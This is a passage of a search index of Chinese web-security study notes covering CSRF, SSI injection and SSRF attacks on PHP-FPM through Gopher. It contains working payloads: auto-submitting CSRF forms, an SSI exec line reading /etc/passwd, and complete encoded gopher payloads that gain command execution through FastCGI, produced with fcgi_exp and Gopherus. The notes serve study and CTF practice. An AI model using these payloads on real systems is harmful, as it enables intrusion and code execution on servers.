\u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\uff1aa.com/act=xx\u3002\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u643a\u5e26a.com\u7684Cookie\u3002a.com\u63a5\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u786e\u8ba4\u662f\u53d7\u5bb3\u8005\u7684\u51ed\u8bc1\uff0c\u8bef\u4ee5\u4e3a\u662f\u53d7\u5bb3\u8005\u81ea\u5df1\u53d1\u9001\u7684\u8bf7\u6c42\u3002a.com\u4ee5\u53d7\u5bb3\u8005\u7684\u540d\u4e49\u6267\u884c\u4e86act=xx\u3002\u653b\u51fb\u5b8c\u6210\uff0c\u653b\u51fb\u8005\u5728\u53d7\u5bb3\u8005\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u5192\u5145\u53d7\u5bb3\u8005\uff0c\u8ba9a.com\u6267\u884c\u4e86\u81ea\u5df1\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002</p> <p>GET\u578b</p> <pre><code>&lt;img src=http://xxx.org/csrf.php?xx=1 /&gt;\n\u8bbf\u95ee\u9875\u9762\u540e\u5c31\u6210\u529f\u5411http://xxx.org/csrf.php \u53d1\u9001\u4e86\u4e00\u6b21\u8bf7\u6c42\n&lt;link href=\"\u2026\"&gt;\n&lt;iframe src=\"\u2026\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\u2026\"&gt;\n&lt;script src=\"\u2026\"&gt;\n&lt;video src=\"\u2026\"&gt;\n&lt;audio src=\"\u2026\"&gt;\n&lt;a href=\"\u2026\"&gt;\n&lt;table background=\"\u2026\"&gt;\nPlain Text\n</code></pre> <p>POST\u578b</p> <pre><code>&lt;form action=http://woyun.org/csrf.php method=POST&gt;\n&lt;input type=\"text\" name='xx' value='11' /&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/CSRF/#_2","title":"\u4f8b\u9898","text":"<p>\u4ece\u4e00\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u4e2d\u770b\u6e17\u900f\u6d4b\u8bd5 - \u5b89\u5168\u5ba2\uff0c\u5b89\u5168\u8d44\u8baf\u5e73\u53f0</p> <p>\u6700\u8fd1\u505a\u4e86\u4e00\u9053\u8d28\u91cf\u633a\u4e0d\u9519\u7684ctf\u9898\uff0c\u6d89\u53caweb\u6e17\u900f\u3001sql\u6ce8\u5165\u3001csrf\u3001\u6743\u9650\u63d0\u5347\u7b49\u77e5\u8bc6\u70b9\uff0c\u6240\u4ee5\u7279\u5730\u91cd\u65b0\u81ea\u5df1\u642d\u4e86\u4e2a\u73af\u5883\u590d\u73b0\u4e86\u4e00\u4e0b\u8fd9\u9053\u9ad8\u8d28\u91cf\u7684ctf\u9898\u5206\u4eab\u7ed9\u5927\u5bb6\uff0c\u5e76\u8c08\u8c08\u4e00\u4e9b\u4e2a\u4eba\u7684\u611f\u609f\u3002</p> <p>https://www.anquanke.com/post/id/97567</p> <p>\u5927\u5bb6\u81ea\u5df1\u770b\u770b\uff1f\u786e\u5b9e\u662f\u9ad8\u7ea7\u70b9\u7684XSS,\u6bd4\u8f83\u91cd\u5408\uff0c\u4e0d\u505a\u8fc7\u591a\u53d9\u8ff0</p>"},{"location":"web/csrf_ssrf_ssi/SSI/","title":"SSI","text":"<p>(shtml\u6f0f\u6d1e)</p> <p>SSI \u6ce8\u5165\u5168\u79f0Server-SideIncludes Injection\uff0c\u5373\u670d\u52a1\u7aef\u5305\u542b\u6ce8\u5165\u3002SSI \u662f\u7c7b\u4f3c\u4e8e CGI\uff0c\u7528\u4e8e\u52a8\u6001\u9875\u9762\u7684\u6307\u4ee4\u3002SSI \u6ce8\u5165\u5141\u8bb8\u8fdc\u7a0b\u5728 Web \u5e94\u7528\u4e2d\u6ce8\u5165\u811a\u672c\u6765\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSI/#ssi_1","title":"SSI\u4ecb\u7ecd\u4e0e\u5229\u7528","text":"<p>SSI\u662f\u5d4c\u5165HTML\u9875\u9762\u4e2d\u7684\u6307\u4ee4\uff0c\u5728\u9875\u9762\u88ab\u63d0\u4f9b\u65f6\u7531\u670d\u52a1\u5668\u8fdb\u884c\u8fd0\u7b97\uff0c\u4ee5\u5bf9\u73b0\u6709HTML\u9875\u9762\u589e\u52a0\u52a8\u6001\u751f\u6210\u7684\u5185\u5bb9\uff0c\u800c\u65e0\u987b\u901a\u8fc7CGI\u7a0b\u5e8f\u63d0\u4f9b\u5176\u6574\u4e2a\u9875\u9762\uff0c\u6216\u8005\u4f7f\u7528\u5176\u4ed6\u52a8\u6001\u6280\u672f\u3002</p> <p>\u4ece\u6280\u672f\u89d2\u5ea6\u4e0a\u6765\u8bf4\uff0cSSI\u5c31\u662f\u5728HTML\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u6ce8\u91ca\u884c\u8c03\u7528\u7684\u547d\u4ee4\u6216\u6307\u9488\uff0c\u5373\u5141\u8bb8\u901a\u8fc7\u5728HTML\u9875\u9762\u6ce8\u5165\u811a\u672c\u6216\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u5728\u5f88\u591a\u4e1a\u52a1\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u4f1a\u663e\u793a\u5728\u9875\u9762\u4e2d\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5b58\u5728\u53cd\u5c04\u578bXSS\u6f0f\u6d1e\u7684\u9875\u9762\uff0c\u5982\u679c\u8f93\u5165\u7684payload\u4e0d\u662fXSS\u4ee3\u7801\u800c\u662fSSI\u7684\u6807\u7b7e\uff0c\u540c\u65f6\u670d\u52a1\u5668\u53c8\u5f00\u542f\u4e86\u5bf9SSI\u7684\u652f\u6301\u7684\u8bdd\u5c31\u4f1a\u5b58\u5728SSI\u6f0f\u6d1e\u3002</p> <p>\u4ece\u5b9a\u4e49\u4e2d\u770b\u51fa\uff0c\u9875\u9762\u4e2d\u6709\u4e00\u5c0f\u90e8\u5206\u662f\u52a8\u6001\u8f93\u51fa\u7684\u65f6\u5019\u4f7f\u7528SSI\uff0c\u6bd4\u5982\uff1a</p> <p>\u00b7       \u6587\u4ef6\u76f8\u5173\u7684\u5c5e\u6027\u5b57\u6bb5</p> <p>\u00b7       \u5f53\u524d\u65f6\u95f4</p> <p>\u00b7       \u8bbf\u5ba2IP</p> <p>\u00b7       \u8c03\u7528CGI\u7a0b\u5e8f</p>"},{"location":"web/csrf_ssrf_ssi/SSI/#_1","title":"SSI","text":"<p>\u600e\u4e48\u8bf4\u5462\uff0c\u5176\u5b9e\u8bb2\u8d77\u6765\u8fd8\u633a\u7b80\u5355\u7684</p> <p>\u8fd9\u4e2a\u6f0f\u6d1e\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u5f00\u542f\u4e00\u4e2a\u6a21\u5f0f\u53eb\u505a\u6ce8\u91ca\u884c\u7684\u5199\u5165</p> <p>\u4e5f\u5c31\u662f\u6bd4\u5982\u4e00\u4e2aHTML\u7f51\u9875</p> <p>\u6211\u4eec\u53ef\u4ee5\u5199\u5165\u6ce8\u91ca</p> <p>\u7136\u540e\u521a\u597d\u8fd9\u6761\u6ce8\u91ca\u5b9e\u53ef\u4ee5\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u7684\u3002</p> <pre><code>\u5176\u4f59\u7684\u8bdd\u8fd8\u6709\uff1a\n\u2460\u663e\u793a\u670d\u52a1\u5668\u7aef\u73af\u5883\u53d8\u91cf&lt;#echo&gt;\n\u672c\u6587\u6863\u540d\u79f0\uff1a\n&lt;!\u2013#echo var=\"DOCUMENT_NAME\"\u2013&gt;\n\u73b0\u5728\u65f6\u95f4\uff1a\n&lt;!\u2013#echo var=\"DATE_LOCAL\"\u2013&gt;\n\u663e\u793aIP\u5730\u5740\uff1a\n&lt;! #echo var=\"REMOTE_ADDR\"\u2013&gt;\n\u2461\u5c06\u6587\u672c\u5185\u5bb9\u76f4\u63a5\u63d2\u5165\u5230\u6587\u6863\u4e2d&lt;#include&gt;\n&lt;! #include file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"index.html\" --&gt;\n&lt;! #include virtual=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#include virtual=\"/www/footer.html\" --&gt;\n\u6ce8\uff1afile\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u5728\u540c\u4e00\u7ea7\u76ee\u5f55\u6216\u5176\u5b50\u76ee\u5f55\u4e2d\uff0c\u4f46\u4e0d\u80fd\u5728\u4e0a\u4e00\u7ea7\u76ee\u5f55\u4e2d\uff0cvirtual\u5305\u542b\u6587\u4ef6\u53ef\u4ee5\u662fWeb\u7ad9\u70b9\u4e0a\u7684\u865a\u62df\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\n\u2462\u663e\u793aWEB\u6587\u6863\u76f8\u5173\u4fe1\u606f&lt;#flastmod&gt;&lt;#fsize&gt;(\u5982\u6587\u4ef6\u5236\u4f5c\u65e5\u671f/\u5927\u5c0f\u7b49)\n\u6587\u4ef6\u6700\u8fd1\u66f4\u65b0\u65e5\u671f\uff1a\n&lt;! #flastmod file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u6587\u4ef6\u7684\u957f\u5ea6\uff1a\n&lt;!\u2013#fsize file=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n\u2463\u76f4\u63a5\u6267\u884c\u670d\u52a1\u5668\u4e0a\u7684\u5404\u79cd\u7a0b\u5e8f&lt;#exec&gt;(\u5982CGI\u6216\u5176\u4ed6\u53ef\u6267\u884c\u7a0b\u5e8f)\n&lt;!\u2013#exec cmd=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cmd=\"cat /etc/passwd\"--&gt;\n&lt;!\u2013#exec cgi=\"\u6587\u4ef6\u540d\u79f0\"\u2013&gt;\n&lt;!--#exec cgi=\"/cgi-bin/access_log.cgi\"\u2013&gt;\n\u76f8\u5f53\u4e8e\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4e86\u6240\u9700\u8981\u7684\u4ee3\u7801\uff0c\u8fd4\u56de\u67e5\u627e\u5373\u53ef\nPlain Text\n</code></pre>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/","title":"FastCGI","text":"<p>FastCGI\u6307\u5feb\u901f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08Fast Common Gateway Interface\uff0fFastCGI\uff09\u662f\u4e00\u79cd\u8ba9\u4ea4\u4e92\u7a0b\u5e8f\u4e0eWeb\u670d\u52a1\u5668\u901a\u4fe1\u7684\u534f\u8bae\u3002FastCGI\u662f\u65e9\u671f\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08CGI\uff09\u7684\u589e\u5f3a\u7248\u672c\u3002FastCGI\u81f4\u529b\u4e8e\u51cf\u5c11\u7f51\u9875\u670d\u52a1\u5668\u4e0eCGI\u7a0b\u5e8f\u4e4b\u95f4\u4ea4\u4e92\u7684\u5f00\u9500\uff0c\u4ece\u800c\u4f7f\u670d\u52a1\u5668\u53ef\u4ee5\u540c\u65f6\u5904\u7406\u66f4\u591a\u7684\u7f51\u9875\u8bf7\u6c42\u3002</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u5728\u7f51\u7ad9\u5206\u7c7b\u4e2d\u5b58\u5728\u4e00\u79cd\u5206\u7c7b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u548c\u52a8\u6001\u7f51\u7ad9\uff0c\u4e24\u8005\u7684\u533a\u522b\u5c31\u662f\u9759\u6001\u7f51\u7ad9\u53ea\u9700\u8981\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u89e3\u6790\uff0c\u800c\u52a8\u6001\u7f51\u7ad9\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u7f16\u8bd1\u89e3\u6790\u7684\u8fc7\u7a0b\u3002\u4ee5Apache\u4e3a\u4f8b\uff0c\u5f53\u8bbf\u95ee\u52a8\u6001\u7f51\u7ad9\u7684\u4e3b\u9875\u65f6\uff0c\u6839\u636e\u5bb9\u5668\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u77e5\u9053\u8fd9\u4e2a\u9875\u9762\u4e0d\u662f\u9759\u6001\u9875\u9762\uff0cWeb\u5bb9\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u8bf7\u6c42\u8fdb\u884c\u7b80\u5355\u7684\u5904\u7406\uff0c\u7136\u540e\u5982\u679c\u4f7f\u7528\u7684\u662fCGI\uff0c\u5c31\u4f1a\u542f\u52a8CGI\u7a0b\u5e8f\uff08\u5bf9\u5e94\u7684\u5c31\u662fPHP\u89e3\u91ca\u5668\uff09\u3002\u63a5\u4e0b\u6765PHP\u89e3\u6790\u5668\u4f1a\u89e3\u6790php.ini\u6587\u4ef6\uff0c\u521d\u59cb\u5316\u6267\u884c\u73af\u5883\uff0c\u7136\u540e\u5904\u7406\u8bf7\u6c42\uff0c\u518d\u4ee5\u89c4\u5b9aCGI\u89c4\u5b9a\u7684\u683c\u5f0f\u8fd4\u56de\u5904\u7406\u540e\u7684\u7ed3\u679c\uff0c\u9000\u51fa\u8fdb\u7a0b\uff0cWeb server\u518d\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u52a8\u6001PHP Web\u8bbf\u95ee\u6d41\u7a0b\u3002\u8fd9\u91cc\u8bf4\u7684\u662f\u4f7f\u7528CGI\uff0c\u800cFastCGI\u5c31\u76f8\u5f53\u4e8e\u9ad8\u6027\u80fd\u7684CGI\uff0c\u4e0eCGI\u4e0d\u540c\u7684\u662f\u5b83\u50cf\u4e00\u4e2a\u5e38\u9a7b\u7684CGI\uff0c\u5728\u542f\u52a8\u540e\u4f1a\u4e00\u76f4\u8fd0\u884c\u7740\uff0c\u4e0d\u9700\u8981\u6bcf\u6b21\u5904\u7406\u6570\u636e\u65f6\u90fd\u542f\u52a8\u4e00\u6b21\uff0c\u6240\u4ee5FastCGI\u7684\u4e3b\u8981\u884c\u4e3a\u662f\u5c06CGI\u89e3\u91ca\u5668\u8fdb\u7a0b\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\uff0c\u5e76\u56e0\u6b64\u83b7\u5f97\u8f83\u9ad8\u7684\u6027\u80fd \u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#php-fpm","title":"php-fpm","text":"<p>FPM\uff08FastCGI \u8fdb\u7a0b\u7ba1\u7406\u5668\uff09\u53ef\u4ee5\u8bf4\u662fFastCGI\u7684\u4e00\u4e2a\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u4e8e\u66ff\u6362 PHP FastCGI \u7684\u5927\u90e8\u5206\u9644\u52a0\u529f\u80fd\uff0c\u5bf9\u4e8e\u9ad8\u8d1f\u8f7d\u7f51\u7ad9\u662f\u975e\u5e38\u6709\u7528\u7684\u3002</p> <p>\u653b\u51fbFastCGI\u7684\u4e3b\u8981\u539f\u7406\u5c31\u662f\uff0c\u5728\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u5b9e\u9645\u8bf7\u6c42\u4e2d\u4f1a\u51fa\u73b0\u4e00\u4e2a<code>SCRIPT_FILENAME': '/var/www/html/index.php</code>\u8fd9\u6837\u7684\u952e\u503c\u5bf9\uff0c\u5b83\u7684\u610f\u601d\u662fphp-fpm\u4f1a\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6837\u5373\u4f7f\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\uff0c\u4f46\u4e5f\u53ea\u80fd\u63a7\u5236php-fpm\u53bb\u6267\u884c\u67d0\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u591f\u5b9e\u73b0\u4e00\u4e9b\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002</p> <p>\u800c\u5728PHP 5.3.9\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cPHP\u589e\u52a0\u4e86\u5b89\u5168\u9009\u9879\u5bfc\u81f4\u53ea\u80fd\u63a7\u5236php-fpm\u6267\u884c\u4e00\u4e9bphp\u3001php4\u8fd9\u6837\u7684\u6587\u4ef6\uff0c\u8fd9\u4e5f\u589e\u5927\u4e86\u653b\u51fb\u7684\u96be\u5ea6\u3002\u4f46\u662f\u597d\u5728PHP\u5141\u8bb8\u901a\u8fc7PHP_ADMIN_VALUE\u548cPHP_VALUE\u53bb\u52a8\u6001\u4fee\u6539PHP\u7684\u8bbe\u7f6e\u3002</p> <p>\u90a3\u4e48\u5f53\u8bbe\u7f6ePHP\u73af\u5883\u53d8\u91cf\u4e3a\uff1a<code>auto_prepend_file = php://input;allow_url_include = On</code>\u65f6\uff0c\u5c31\u4f1a\u5728\u6267\u884cPHP\u811a\u672c\u4e4b\u524d\u5305\u542b\u73af\u5883\u53d8\u91cf<code>auto_prepend_file</code>\u6240\u6307\u5411\u7684\u6587\u4ef6\u5185\u5bb9\uff0c<code>php://input</code>\u4e5f\u5c31\u662f\u63a5\u6536POST\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5728FastCGI\u534f\u8bae\u7684body\u63a7\u5236\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u6837\u5c31\u5728\u7406\u8bba\u4e0a\u5b9e\u73b0\u4e86php-fpm\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb\u3002</p> <p>\u8be6\u60c5\u8bf7\u89c1\uff1a\u300aSSRF\u7cfb\u5217\u4e4b\u653b\u51fbFastCGI\u300b</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1a</p> <p></p> <p>WEB\u670d\u52a1\u5668Ubuntu\uff08192.168.43.166\uff09\u5b58\u5728SSRF\u6f0f\u6d1e\uff1a</p> <p></p> <p>\u5e76\u4e14WEB\u670d\u52a1\u5668Ubuntu\u4e0a\u5b58\u5728FastCGI\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5176SSRF\u6f0f\u6d1e\u53bb\u653b\u51fb\u5176\u672c\u5730\u7684FastCGI\u3002</p> <p>\u5047\u8bbe\u5728\u914d\u7f6efpm\u65f6\uff0c\u5c06\u76d1\u542c\u7684\u5730\u5740\u8bbe\u4e3a\u4e860.0.0.0:9000\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751fphp-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u53ef\u4ee5\u65e0\u9700\u5229\u7528SSRF\u4ece\u670d\u52a1\u5668\u672c\u5730\u8bbf\u95ee\u7684\u7279\u6027\uff0c\u76f4\u63a5\u4e0e\u670d\u52a1\u56689000\u7aef\u53e3\u4e0a\u7684php-fpm\u8fdb\u884c\u901a\u4fe1\uff0c\u8fdb\u800c\u53ef\u4ee5\u7528fcgi_exp\u7b49\u5de5\u5177\u53bb\u653b\u51fb\u670d\u52a1\u5668\u4e0a\u7684php-fpm\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u5f53\u5185\u7f51\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u4e0a\u914d\u7f6e\u6709fpm\uff0c\u4e14\u76d1\u542c\u7684\u5730\u5740\u4e3a0.0.0.0:9000\u65f6\uff0c\u90a3\u4e48\u8fd9\u53f0\u4e3b\u673a\u5c31\u53ef\u80fd\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\uff0c\u5982\u679c\u5185\u7f51\u4e2d\u7684\u8fd9\u53f0\u4e3b\u673a\u4e0d\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\u663e\u7136\u662f\u4e0d\u884c\u7684\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#fcgi_exp","title":"\u4f7f\u7528fcgi_exp\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/piaca/fcgi_exp</p> <p>\u8fd9\u4e2a\u5de5\u5177\u4e3b\u8981\u662f\u7528\u6765\u653b\u51fb\u672a\u6388\u6743\u8bbf\u95eephp-fpm\u7684\uff0c\u53ef\u7528\u6765\u6d4b\u8bd5\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u653b\u51fbphp-fpm\uff0c\u4f46\u9700\u8981\u81ea\u5df1\u5c06\u751f\u6210\u7684payload\u8fdb\u884c\u8f6c\u6362\u4e00\u4e0b\u3002</p> <p>\u8be5\u5de5\u5177\u9700\u8981go\u8bed\u8a00\u73af\u5883\uff0c\u4e0b\u8f7d\u540e\u8fdb\u5165\u76ee\u5f55\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a</p> <pre><code>go build fcgi_exp.go \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# \u7f16\u8bd1fcgi_exp.go\nPlain Text\n</code></pre> <p>\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5728\u653b\u51fb\u673a\u4e0a\u4f7f\u7528<code>nc -lvvp 2333 &gt; fcg_exp.txt</code>\u76d1\u542c2333 \u7aef\u53e3\u6765\u63a5\u6536fcgi_exp\u751f\u6210\u7684payload\uff0c\u53e6\u5916\u518d\u5f00\u542f\u4e00\u4e2a\u7ec8\u7aef\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u54112333\u7aef\u53e3\u53d1\u9001payload\uff1a</p> <pre><code>./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\nPlain Text\n</code></pre> <p></p> <p>\u751f\u6210\u7684fcg_exp.txt\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u63a5\u6536\u5230\u7684payload\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a</p> <p></p> <p>\u7136\u540e\u5bf9fcg_exp.txt\u6587\u4ef6\u91cc\u7684payload\u8fdb\u884curl\u7f16\u7801\uff0c\u8fd9\u91cc\u901a\u8fc7\u5982\u4e0b\u811a\u672c\u5b9e\u73b0\uff08\u811a\u672c\u662f\u6211\u4ece\u7f51\u4e0a\u767d\u5ad6\u7684\u563f\u563f\uff09\uff1a</p> <pre><code># -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencode\u200bfile = open('fcg_exp.txt','r')payload = file.read()print(\"gopher://127.0.0.1:9000/_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\nPlain Text\n</code></pre> <p>\u6267\u884c\u4e0a\u9762\u7684python\u811a\u672c\u751f\u6210\u5982\u4e0bpayload\uff1a</p> <p></p> <p>\u8fd9\u91cc\u8fd8\u8981\u5bf9\u4e0a\u9762\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u7136\u540e\u5c06\u6700\u7ec8\u7684payload\u5185\u5bb9\u653e\u5230?url=\u540e\u9762\u53d1\u9001\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\nPlain Text\n</code></pre> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff1a</p> <p></p>"},{"location":"web/csrf_ssrf_ssi/SSRF/FastCGI/#gopherus","title":"\u4f7f\u7528Gopherus\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/tarunkant/Gopherus</p> <p>\u8be5\u5de5\u5177\u53ef\u4ee5\u5e2e\u4f60\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff0c\u4ee5\u5229\u7528SSRF\u653b\u51fbRedis\u3001FastCGI\u3001MySql\u7b49\u5185\u7f51\u5e94\u7528\u3002</p> <p>\u4f7f\u7528Gopherus\u5de5\u5177\u751f\u6210\u653b\u51fbFastCGI\u7684payload\uff1a</p> <pre><code>python gopherus.py --exploit fastcgi/var/www/html/index.php \u00a0 \u00a0# \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u5df2\u77e5\u5b58\u5728\u7684php\u6587\u4ef6id \u00a0 \u00a0# \u8f93\u5165\u4e00\u4e2a\u4f60\u8981\u6267\u884c\u7684\u547d\u4ee4\nPlain Text\n</code></pre> <p></p> <p>\u7136\u540e\u8fd8\u662f\u5c06\u5f97\u5230\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u5c06\u6700\u7ec8\u5f97\u5230\u7684payload\u653e\u5230?url=\u540e\u9762\u6253\u8fc7\u53bb\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\nPlain Text\n</code></pre> <p></p> <p>\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002</p>"},{"location":"web/csrf_ssrf_ssi/SSRF/Gopher%E5%8D%8F%E8%AE%AE/","title":"Gopher\u534f\u8bae","text":"<p>\u8fd9\u4e2a\u5f88\u91cd\u8981</p> <p>Gopher\u534f\u8bae\u5728SSRF\u4e2d\u7684\u5229\u7528</p> <p>Gopher\u662fInternet\u4e0a\u4e00\u4e2a\u975e\u5e38\u6709\u540d\u7684\u4fe1\u606f\u67e5\u627e\u7cfb\u7edf\uff0c\u5b83\u5c06Internet\u4e0a\u7684\u6587\u4ef6\u7ec4\u7ec7\u6210\u67d0\u79cd\u7d22\u5f15\uff0c\u5f88\u65b9\u4fbf\u5730\u5c06\u7528\u6237\u4eceInternet\u7684\u4e00\u5904\u5e26\u5230\u53e6\u4e00\u5904\u3002\u5728WWW\u51fa\u73b0\u4e4b\u524d\uff0cGopher\u662fInternet\u4e0a\u6700\u4e3b\u8981\u7684\u4fe1\u606f\u68c0\u7d22\u5de5\u5177\uff0cGopher\u7ad9\u70b9\u4e5f\u662f\u6700\u4e3b\u8981\u7684\u7ad9\u70b9\uff0c\u4f7f\u7528TCP 70\u7aef\u53e3\u3002\u4f46\u5728WWW\u51fa\u73b0\u540e\uff0cGopher\u5931\u53bb\u4e86\u6614\u65e5\u7684\u8f89\u714c\u3002</p> 